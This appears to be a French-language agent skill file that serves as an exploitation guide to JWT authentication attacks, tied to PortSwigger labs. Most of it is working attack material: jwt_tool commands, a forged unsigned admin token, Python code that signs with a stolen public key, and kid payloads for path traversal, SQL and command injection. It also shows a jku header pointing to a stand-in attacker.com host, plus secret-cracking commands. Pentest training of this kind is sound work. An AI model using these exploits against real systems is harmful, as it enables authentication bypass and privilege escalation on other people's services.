---
name: jwt-attacks
description: Guide complet des attaques JWT — alg confusion, JWK injection, kid injection, none algorithm, JKU SSRF, échecs de vérification
---

# JWT Attacks — Guide d'Exploitation Avancé

## Références principales
- **PortSwigger** : https://portswigger.net/web-security/jwt
- **HackTricks** : https://hacktricks.wiki/en/pentesting-web/jwt-json-web-token/
- **jwt_tool** : https://github.com/ticarpi/jwt_tool
- **jwt.io** : https://jwt.io

---

## Structure d'un JWT

```
header.payload.signature
```

Encodé en base64url, chaque partie séparée par un point.

### Header typique
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-1"
}
```

### Payload (claims)
```json
{
  "sub": "admin",
  "iat": 1516239022,
  "exp": 1516242622,
  "role": "user"
}
```

---

## Attaques par algorithme

### 1. Algorithme None (CVE-2015-9235)

Quand le serveur accepte des tokens sans signature.

```bash
# jwt_tool
python3 jwt_tool.py <JWT> -X a

# Manuel
# Header: {"alg":"none","typ":"JWT"}
# Signature: (vide)
```

**Payload** : `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.`

### 2. Algorithme Confusion — RS256 → HS256 (CVE-2016-5431)

Si le serveur utilise RSA (asymétrique) mais accepte HMAC (symétrique), on peut signer avec la clé publique RSA.

```bash
# Récupérer la clé publique du serveur
openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout > pubkey.pem

# Transformer en HMAC key et signer
python3 jwt_tool.py <JWT> -X k -pk pubkey.pem

# Ou avec python
python3 -c "
import jwt
pub_key = open('pubkey.pem').read()
payload = {'sub':'admin','role':'admin'}
token = jwt.encode(payload, pub_key, algorithm='HS256')
print(token)
"
```

### 3. JWK Injection — Injection de clé publique

Si le header contient `jwk` ou `jku` et que le serveur ne valide pas la source de la clé.

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "...",
    "e": "AQAB"
  }
}
```

```bash
# Générer une paire de clés et injecter la clé publique
python3 jwt_tool.py <JWT> -X i -I -pc name -pv value

# Ou avec Burp : JWT Editor extension
# 1. Generate new RSA key
# 2. Embed as JWK
# 3. Sign with private key
```

### 4. Kid Injection — Injection dans le champ kid

Le `kid` (Key ID) est souvent utilisé pour indexer des clés. Injection possible si non assaini.

#### Path traversal
```json
{
  "alg": "HS256",
  "kid": "../../../../dev/null"
}
```

```bash
# Signature avec secret vide
python3 jwt_tool.py <JWT> -X k -pk /dev/null
```

#### SQL injection si kid est utilisé dans une requête SQL
```json
{
  "alg": "HS256",
  "kid": "key1' UNION SELECT 'secret' -- "
}
```

#### Command injection
```json
{
  "alg": "HS256",
  "kid": "key1 | echo secret"
}
```

---

## Attaques sur les claims

### Modification des claims

```bash
# Décoder
echo -n '<payload_base64>' | base64 -d 2>/dev/null

# Modifier et re-encoder
echo -n '{"sub":"admin","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_'

# jwt_tool toute la chaîne
python3 jwt_tool.py <JWT> -I -pc "role" -pv "admin"
```

### Unverified JWT

```bash
# JWT sans vérification de signature
python3 jwt_tool.py <JWT> -X a
```

---

## Attaques par JKU/JWK SSRF

```json
{
  "alg": "RS256",
  "jku": "http://attacker.com/jwk.json",
  "kid": "controlled"
}
```

Héberger un JWK JSON sur son serveur :
```json
{
  "keys": [{
    "kty": "RSA",
    "kid": "controlled",
    "n": "...",
    "e": "AQAB"
  }]
}
```

---

## Outils

```bash
# Installation jwt_tool
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 jwt_tool.py <JWT>

# crack JWT (bruteforce secret)
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# JSON Web Token Analyzer
pip install pyjwt
pip install pyjwt[crypto]

# PortSwigger JWT Editor (Burp extension)
```

### jwt_tool — Commandes essentielles

```bash
# Scan automatique
python3 jwt_tool.py <JWT> -t -c "Cookie: jwt=<JWT>"

# Test algo none
python3 jwt_tool.py <JWT> -X a

# Test algo confusion RS→HS
python3 jwt_tool.py <JWT> -X k -pk pubkey.pem

# Injection JWK
python3 jwt_tool.py <JWT> -X i

# Modification payload
python3 jwt_tool.py <JWT> -I -pc "role" -pv "admin" -S hs256 -k secret.key

# Kid injection
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

---

## Détection des vulnérabilités JWT

### Checklist manuelle

```
☐ Le serveur vérifie-t-il la signature ?
☐ L'algorithme none est-il accepté ?
☐ Peut-on changer RS256 en HS256 ?
☐ Le header JWK/JKU est-il accepté ?
☐ Le kid est-il vulnérable à path traversal / injection ?
☐ Y a-t-il des claims non validés (role, admin, sub) ?
☐ Le secret HMAC est-il faible (bruteforceable) ?
☐ Le JWT expire-t-il ? Peut-on le réutiliser après expiration ?
☐ Y a-t-il une fuite de JWT dans les logs / URLs / JS ?
```

---

## Labos PortSwigger

| Lab | Description |
|-----|-------------|
| JWT authentication bypass via unverified signature | Test algo none |
| JWT authentication bypass via flawed signature verification | Confusion alg |
| JWT authentication bypass via weak signing key | Secret faible |
| JWT authentication bypass via jwk header injection | JWK inject |
| JWT authentication bypass via jku header injection | JKU SSRF |
| JWT authentication bypass via kid header path traversal | Kid traversal |
```